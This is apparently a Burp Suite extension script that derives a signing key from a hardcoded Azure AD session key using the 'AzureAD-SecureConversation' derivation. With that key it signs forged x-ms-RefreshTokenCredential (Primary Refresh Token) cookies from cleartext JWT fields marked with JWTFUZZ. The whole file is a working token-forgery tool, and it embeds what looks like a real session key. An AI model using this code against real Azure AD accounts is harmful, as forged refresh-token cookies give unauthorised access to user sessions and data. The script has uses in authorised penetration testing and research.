"""
This script will encode and sign "cleartext" jwt with AAD sessionkey
You can just put unbased cleartext JWT in repeater or intruder and script will encode it and sign it with provided HS256 key

For example:
instead of JWT 

Cookie: x-ms-RefreshTokenCredential=eyJ0eXAiO....

You put it in cleartext with JWTFUZZ brackets:

Cookie: x-ms-RefreshTokenCredential=JWTFUZZHeaders = {
  "typ": "JWT",
  "alg": "HS256",
  "ctx": "P6j5ObR0Ka49mHUPnmzi1B65qmVnyhGG"
}
Payload = {
  "refresh_token": "0.ATwA...dr",
  "request_nonce": "Aw...gAA"
}
Signature = "SH...fuo0"JWTFUZZ

or (json-formatted without extenstion words: Headers = ..., Payload = ...):
Cookie: x-ms-RefreshTokenCredential=JWTFUZZ[{
  "typ": "JWT",
  "alg": "HS256",
  "ctx": "P6j5ObR0Ka49mHUPnmzi1B65qmVnyhGG"
},{
  "refresh_token": "0.ATwA...dr",
  "request_nonce": "Aw...gAA"
},"SH...fuo0"]JWTFUZZ

No empty newlines are allowed !!!

Additionaly, you can check result in Logger++ extension
To correct work you have to install python2 libs: 
pip2 install pyjwt
and tell burp extender use corect python2 libs path (ex: /usr/local/lib/python2.7/dist-packages)
"""
#HS265 secret kes
#Microsoft AAD session key
key = "691232125467fbb4c25dffb5d40fa88cdab3276983343e0eec4097ce05b7d0dc"

def calculate_derived_key(sessionkey, context=None):
        import binascii
        from  javax.crypto import Mac;
        from  javax.crypto.spec import SecretKeySpec;

        label = "AzureAD-SecureConversation"
        hmacSecret="\x00\x00\x00\x01" + label + "\x00" + context + "\x00\x00\x01\x00"
        #print("hmacSecret key: " + binascii.hexlify(hmacSecret))

        mac = Mac.getInstance("HmacSHA256")
        secretKeySpec = SecretKeySpec(sessionkey, "HmacSHA256");
        mac.init(secretKeySpec);
        hmacSha256 = mac.doFinal(hmacSecret);

        return hmacSha256

if toolFlag in (callbacks.TOOL_REPEATER, callbacks.TOOL_SCANNER, callbacks.TOOL_EXTENDER ):
    # only apply to requests
    if messageIsRequest:
        import re
        import json
        import jwt
        import hashlib
        import base64
        from collections import OrderedDict
        import os
        import binascii

        request = helpers.bytesToString(messageInfo.getRequest())

        
        key = binascii.unhexlify(key)
        
        match = re.search(r'JWTFUZZ.*JWTFUZZ', request,re.DOTALL)
        
        if match:
            #print "Found FUZZ point"
            jwtfuzz = match.group(0)

            #normalize to json
            jwtfuzz = jwtfuzz.replace("Headers = ","").replace("Headers=","")
            jwtfuzz = jwtfuzz.replace("Payload = ", ",").replace("Payload=", ",")
            jwtfuzz = jwtfuzz.replace("Signature = ", ",").replace("Signature=", ",")
            jwtfuzz = jwtfuzz.replace(",,", ",").replace("\n","").replace("JWTFUZZ","")
            jwtfuzz = "[" + jwtfuzz + "]"

            jwtjson = json.loads(jwtfuzz,"UTF-8")
            #jwtjson = json.loads(jwtfuzz,object_pairs_hook=OrderedDict)
        
            headers=jwtjson[0]

            if headers.__contains__('ctx'):
                ctx = headers['ctx']
                context = base64.b64decode(ctx)
            else:
                context = os.urandom(24)

            payload=jwtjson[1]
            headers={'typ':'JWT','alg':'HS256','ctx':ctx}

            #check if jwt user key derivation function 2
            if headers.__contains__('kdf_ver'):
                kdf2string = binascii.unhexlify(context) + json.dumps(payload).replace(' ', '').encode('ascii')
                context = hashlib.sha256(kdf2string).hexdigest()

            #calculate derived_key
            derived_key = calculate_derived_key(key, context)
            print("Derived key: " + binascii.hexlify(derived_key))

            #signing with derived key and encode jwt
            encodedjwt = jwt.encode(payload, derived_key.tostring(), algorithm="HS256", headers=headers)
            #print(encodedjwt)
            newrequest = request.replace(match.group(0),encodedjwt)


            #burp api hack to update Content-Length...
            tmpparam = helpers.buildParameter("bbbtest","1",0)
            newrequest = helpers.updateParameter(newrequest,tmpparam)
            newrequest = helpers.removeParameter(newrequest,tmpparam)
        
            messageInfo.setRequest(newrequest)

        else:
            print "FUZZ point not found"
            newrequest = request
